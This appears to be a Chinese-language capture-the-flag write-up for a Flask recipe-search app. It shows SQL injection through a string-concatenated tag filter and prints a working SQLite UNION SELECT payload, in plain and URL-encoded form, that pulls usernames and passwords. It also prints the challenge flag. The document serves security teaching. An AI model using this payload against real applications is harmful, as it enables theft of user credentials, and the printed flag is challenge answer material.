# Cooking Flask

## 题目简述

Flask 应用提供食谱搜索。名称和描述使用 SQLite 参数占位符，但标签条件由字符串拼接生成：

```python
tag_conditions = " OR ".join(
    ["json_extract(tags, '$') LIKE '%\"" + tag + "\"%'" for tag in tags]
)
query += " AND (" + tag_conditions + ")"
```

应用还以 `debug=True` 启动，数据库异常会直接暴露查询和类型转换细节。目标是通过标签参数 SQL 注入读取 `user.password`；查询结果之后还必须能被八字段 `Recipe` 模型正常解析。

## 解题过程

先在 `tags` 中放入单引号确认异常。调试页面显示最终结构为：

```sql
SELECT * FROM recipe WHERE 1=1
AND (json_extract(tags, '$') LIKE '%"<tag>"%')
```

注入需要闭合双引号内容、百分号、单引号和外层括号，再做 `UNION SELECT`。`recipe` 有 8 列，而 Pydantic 模型分别要求整数 ID、字符串、可解析日期、图片、描述、步骤、JSON 标签和整数用户 ID，所以构造同类型的 8 列：

```text
breakfast"%') Union Select
1,password,'2012-10-10','d',username,'f','[]',7
from user--
```

对应的 URL 编码请求参数可以写为：

```text
recipe_name=&description=&tags=breakfast%22%25%27%29%20Union%20Select%201%2Cpassword%2C%272012-10-10%27%2C%27d%27%2Cusername%2C%27f%27%2C%27%5B%5D%27%2C7%20from%20user--%20
```

联合查询行被当作食谱渲染，其中 `recipe_name` 对应密码、`recipe_description` 对应用户名。管理员密码字段直接包含：

```text
byuctf{pl34s3_p4r4m3t3r1z3_y0ur_1nputs_4nd_h4sh_p4ssw0rds}
```

官方材料中的 25 张图片仅是浏览器、调试页、Burp、代码和最终文本截图；上述可复制查询、类型约束与 payload 已完整转写，因此不保留截图。

## 方法总结

- 核心技巧：利用标签过滤器的字符串拼接完成 SQLite UNION 注入，并让伪造行满足应用对象模型的列数与类型。
- 识别信号：同一查询中部分字段参数化、部分字段由循环拼接时，后者仍是注入点；ORM/Pydantic 报错还能反向泄露目标列类型。
- 复用要点：不仅要让 SQL 执行成功，还要通过查询后的反序列化与模板渲染；注释符后保留空白可稳定截断残余语句。
